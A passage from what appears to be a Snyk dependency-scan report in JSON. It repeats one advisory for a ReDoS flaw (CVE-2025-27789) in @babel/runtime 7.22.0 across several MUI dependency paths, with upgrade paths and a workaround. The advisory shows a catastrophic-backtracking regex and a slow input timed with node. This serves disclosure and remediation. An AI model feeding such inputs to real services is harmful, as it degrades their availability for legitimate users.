        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@mui/system@5.13.2",
          "@mui/private-theming@5.13.1",
          "@mui/utils@5.13.1",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/system@5.13.2",
          "@mui/private-theming@5.17.1",
          "@mui/utils@5.17.1",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@mui/styles@5.13.2",
          "@mui/private-theming@5.13.1",
          "@mui/utils@5.13.1",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/styles@5.18.0",
          "@mui/private-theming@5.17.1",
          "@mui/utils@5.17.1",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@mui/material@5.13.2",
          "@mui/system@5.13.2",
          "@mui/private-theming@5.13.1",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/material@5.13.2",
          "@mui/system@5.18.0",
          "@mui/private-theming@5.17.1",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@mui/material@5.13.2",
          "@mui/system@5.13.2",
          "@mui/styled-engine@5.13.2",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/material@5.13.2",
          "@mui/system@5.18.0",
          "@mui/styled-engine@5.18.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
